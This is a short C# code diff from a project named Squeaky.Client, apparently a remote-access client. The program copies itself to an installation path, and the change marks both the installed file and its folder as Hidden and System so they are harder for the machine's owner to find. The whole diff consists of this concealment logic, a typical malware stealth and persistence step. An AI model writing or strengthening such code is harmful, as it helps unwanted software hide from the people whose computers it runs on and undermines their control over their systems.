@@ -55,12 +55,12 @@ namespace Squeaky.Client
             }
 
             File.Copy(CurrentLocation, Settings.INSTALLATION);
-            File.SetAttributes(Settings.INSTALLATION, FileAttributes.Hidden);
+            File.SetAttributes(Settings.INSTALLATION, File.GetAttributes(Settings.INSTALLATION) | FileAttributes.Hidden | FileAttributes.System);
 
-            if (! string.IsNullOrEmpty(Settings.SUBDIRECTORY))
+            if (!string.IsNullOrEmpty(Settings.SUBDIRECTORY))
             {
                 DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLATION));
-                di.Attributes |= FileAttributes.Hidden;
+                di.Attributes |= FileAttributes.Hidden | FileAttributes.System;
             }
         }
 
